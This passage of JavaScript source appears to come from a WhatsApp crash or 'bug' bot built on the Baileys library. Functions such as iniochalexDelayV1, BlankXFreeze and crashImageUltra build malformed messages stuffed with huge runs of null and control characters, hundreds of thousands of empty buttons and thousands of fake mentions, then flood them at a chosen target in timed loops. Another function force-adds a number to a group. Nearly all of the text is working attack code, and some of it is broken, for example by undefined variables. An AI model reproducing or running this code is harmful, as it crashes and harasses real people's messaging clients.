                                { name: "galaxy_message", paramsJson: "\u0000".repeat(93000) }
                            ]
                        }
                    },
                    version: 3,
                },
            },
        };
   console.log(chalk.red(`end sending bug to ${target}`));                   
    for (const msg of [msg1, msg2, msg3, msg4]) {  
      await sock.relayMessage("status@broadcast", msg, {  
        messageId: undefined,  
        statusJidList: [target],  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }  
            ]  
          }  
        ]  
      });  

      console.log(`all sending sucses to ${target}`);  
    }

  } catch (e) {
    console.error(e);
  }
}

async function groupBan(sock, target) {
    if (!target.endsWith("@g.us")) throw "@g.us server required"

    try {
        await sock.groupParticipantsUpdate(
            target,
            ["13135550002@s.whatsapp.net"],
            "add"
        )
    } catch (e) {
        throw e
    }
}

async function iniochalexDelayV1(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "LexzyModss - Executed",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " GhostCrash3r " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `Skylinne - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "Skylinne - Executed",
                                fileName: "Skylinne - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "Skylinne - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        participant: target,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "Skylinne - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        participant: target,
        messageId: Lexcaa.key.id
    });

    await sock.relayMessage(target, {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\x10' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\x10","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: target });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "Skylinne - Executed¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 450000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        participant: target,
    });

    const startTime3 = Date.now();
    const duration3 = 4 * 60 * 1000;
    while (Date.now() - startTime3 < duration3) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Skylinne - Executed¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "GhostCrasher",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0003".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Skylinne - Executed‽!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Skylinne - Executed¿!",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"mmklu","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(9000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 2,
                                    expiryTimestamp: Math.floor(Date.now() / 1999) + 8640000
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(resolve => setTimeout(resolve, 900));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1999 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }, { participant: target });
    }

    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Skylinne - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    const ocha = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Skylinne - Executed¿!",
                    },
                    nativeFlowMessage: {
                        buttons: "[".repeat(75000),
                    },
                },
            },
        },
    };

    const iniocha = generateWAMessageFromContent(target, ocha, {});

    await sock.relayMessage(target, iniocha.message, {
        participant: target,
        messageId: iniocha.key.id
    });
}

async function BlankXFreeze(sock, groupJid) {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/rb111f.mp4", gifPlayback: true }
  }, {
    upload: sock.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(groupJid, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [groupJid],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "https://ghostcrasher18",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: { text: "- # GhostCrash3r ん.? " },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}`
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: groupJid })
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
}

async function crashImageUltra(sock, target) {
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    const corruptImage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/791885237_1370954038350659_525984428811205570_n.enc?ccb=11-4&oh=01_Q5Aa5gEmTwfJ3abnydAfI8Ep6VahU4nyo_VO9PqUfxxbFFNH8Q&oe=6AC35930&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "mIl61rSmQ4E4z82XpSvhmpSOT8ByiqgLVwrPk4zC4+4=",
        fileLength: "9999999999",
        height: 9999,
        width: 9999,
        mediaKey: "q3wk/KIXEaRS4QD7VG+n5jWvnbdMcO/xjhZ7h4SCBmI=",
        fileEncSha256: "iG6x4KtQSfdcjLNipUagllg3k8Yj3ANspD+9bWstHB0=",
        directPath: "/v/t62.7118-24/791885237_1370954038350659_525984428811205570_n.enc?ccb=11-4&oh=01_Q5Aa5gEmTwfJ3abnydAfI8Ep6VahU4nyo_VO9PqUfxxbFFNH8Q&oe=6AC35930&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1788599798",
        jpegThumbnail: "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